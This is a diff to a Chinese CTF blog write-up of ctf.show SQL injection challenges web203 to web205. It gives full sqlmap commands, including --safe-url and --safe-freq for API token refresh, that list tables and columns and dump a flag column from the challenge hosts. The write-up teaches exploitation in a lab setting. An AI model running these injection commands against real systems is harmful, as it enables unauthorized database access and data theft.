@@ -3817,8 +3817,20 @@ web82写的脚本改改直接用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;aff779db-d32d-41cb-b944-6cead4df2130.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>
 <h3 id="web204"><a class="header-anchor" href="#web204">¶</a>web204</h3>
 <p>提示传递cookie，我们再加个cookie参数就好了，cookie可以通过抓包获得</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;31d8cf4d-d658-4b3f-95bb-0068034e2304.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --header&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --method&#x3D;PUT  --cookie&#x3D;&quot;PHPSESSID&#x3D;ijpf0cduare0gakqaihmah8nm1; ctfshow&#x3D;f6757abd63836da6e094a4e776213b5b&quot; -D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; -C &quot;pass&quot; --dump</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;31d8cf4d-d658-4b3f-95bb-0068034e2304.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --method&#x3D;PUT  --cookie&#x3D;&quot;PHPSESSID&#x3D;ijpf0cduare0gakqaihmah8nm1; ctfshow&#x3D;f6757abd63836da6e094a4e776213b5b&quot; -D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; -C &quot;pass&quot; --dump</span><br></pre></td></tr></table></figure>
 <h3 id="web205"><a class="header-anchor" href="#web205">¶</a>web205</h3>
+<p>提示需要api鉴权，具体啥api我们抓包看看<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web205/N69%249%60F_9V%40_%7B05ELSDS2T8.png" alt=""><br>
+可以看到每次请求api的时候首先会去请求一次getToken.php，而sqlmap中提供了以下两个参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br><span class="line">--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure>
+<p>查表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables</span><br></pre></td></tr></table></figure>
+<p>得到表名为ctfshow_flax，查字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax --columns</span><br></pre></td></tr></table></figure>
+<p>得到列flagx，获取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="web206"><a class="header-anchor" href="#web206">¶</a>web206</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
